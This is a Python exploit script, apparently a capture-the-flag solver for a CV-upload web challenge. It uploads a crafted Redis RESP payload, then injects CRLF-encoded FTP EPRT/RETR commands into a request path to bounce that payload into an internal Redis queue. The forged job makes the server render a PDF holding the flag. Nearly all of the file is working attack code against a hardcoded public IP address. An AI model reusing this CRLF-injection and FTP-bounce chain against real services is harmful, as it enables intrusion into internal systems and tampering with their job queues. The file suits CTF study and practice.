#!/usr/bin/env python3
import argparse
import io
import json
import re
import shutil
import socket
import subprocess
import tempfile
import time
import zipfile
import zlib
from urllib.parse import urlparse

import requests


DEFAULT_BASE = "http://158.160.221.45:7423"
DEFAULT_REDIS_IP = "172.18.0.4"
DEFAULT_MARKER = "11111111-1111-1111-1111-111111111111"
PDF_LINK_RE = re.compile(r"/cv/([0-9a-f-]+)\.pdf")
FLAG_RE = re.compile(rb"LB\{[^}\s]+\}")


def make_docx(text):
    document_xml = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>{text}</w:t></w:r></w:p>
  </w:body>
</w:document>
"""
    content_types = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>
"""
    rels = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>
"""
    out = io.BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", content_types)
        zf.writestr("_rels/.rels", rels)
        zf.writestr("word/document.xml", document_xml)
    return out.getvalue()


def submit_file(sess, base, filename, content, content_type):
    files = {"cv": (filename, content, content_type)}
    data = {
        "full_name": "solver",
        "email": "solver@example.com",
        "phone": "1",
        "position": "test",
    }
    r = sess.post(f"{base}/apply", data=data, files=files, timeout=30)
    r.raise_for_status()
    m = PDF_LINK_RE.search(r.text)
    if not m:
        raise RuntimeError("failed to recover returned UUID from /apply response")
    return m.group(1)


def build_resp_payload(doc_uuid, marker_uuid):
    job = json.dumps(
        {
            "user_id": 1,
            "filename": f"{doc_uuid}.docx",
            "cv_uuid": marker_uuid,
        },
        separators=(",", ":"),
    )
    return f"*3\r\n$5\r\nRPUSH\r\n$4\r\njobs\r\n${len(job)}\r\n{job}\r\n".encode()


def raw_get(base, raw_path):
    parsed = urlparse(base)
    host = parsed.hostname
    if not host:
        raise RuntimeError("invalid base URL")
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    target = raw_path if raw_path.startswith("/") else "/" + raw_path
    host_header = host if parsed.port is None else f"{host}:{port}"
    request = (
        f"GET {target} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()

    with socket.create_connection((host, port), timeout=20) as sock:
        sock.sendall(request)
        chunks = []
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
    return b"".join(chunks)


def extract_flag_from_pdf(pdf_bytes):
    m = FLAG_RE.search(pdf_bytes)
    if m:
        return m.group(0).decode()

    if shutil.which("pdftotext"):
        with tempfile.NamedTemporaryFile(suffix=".pdf") as fh:
            fh.write(pdf_bytes)
            fh.flush()
            proc = subprocess.run(
                ["pdftotext", fh.name, "-"],
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                check=False,
            )
        m = FLAG_RE.search(proc.stdout)
        if m:
            return m.group(0).decode()

    for stream in re.finditer(rb"stream\r?\n(.*?)\r?\nendstream", pdf_bytes, re.S):
        raw = stream.group(1)
        for candidate in (raw, _maybe_inflate(raw)):
            if not candidate:
                continue
            m = FLAG_RE.search(candidate)
            if m:
                return m.group(0).decode()

    return None


def _maybe_inflate(data):
    try:
        return zlib.decompress(data)
    except zlib.error:
        return None


def main():
    ap = argparse.ArgumentParser(description="Exploit the FTP/Redis worker chain in web chall3.")
    ap.add_argument("--base", default=DEFAULT_BASE, help="target base URL")
    ap.add_argument("--redis-ip", default=DEFAULT_REDIS_IP, help="Redis container IP used for EPRT bounce")
    ap.add_argument("--marker", default=DEFAULT_MARKER, help="attacker-chosen output PDF UUID")
    ap.add_argument("--polls", type=int, default=20, help="number of polls for the generated PDF")
    ap.add_argument("--poll-delay", type=float, default=1.0, help="seconds between polls")
    args = ap.parse_args()

    sess = requests.Session()

    doc_uuid = submit_file(
        sess,
        args.base,
        "stage1.docx",
        make_docx("admin cv"),
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    )
    print(f"DOC_UUID={doc_uuid}")

    resp_uuid = submit_file(
        sess,
        args.base,
        "job.resp",
        build_resp_payload(doc_uuid, args.marker),
        "application/octet-stream",
    )
    print(f"RESP_UUID={resp_uuid}")

    inject_path = (
        f"/cv/{resp_uuid}.resp%0d%0a"
        f"EPRT%20|1|{args.redis_ip}|6379|%0d%0a"
        f"RETR%20{resp_uuid}.resp"
    )
    raw_get(args.base, inject_path)

    pdf_url = f"{args.base}/cv/{args.marker}.pdf"
    for _ in range(args.polls):
        r = sess.get(pdf_url, timeout=15)
        if r.status_code == 200:
            flag = extract_flag_from_pdf(r.content)
            if flag:
                print(flag)
                return
            raise SystemExit("pdf fetched but flag extraction failed")
        time.sleep(args.poll_delay)

    raise SystemExit("flag pdf not ready before timeout")


if __name__ == "__main__":
    main()
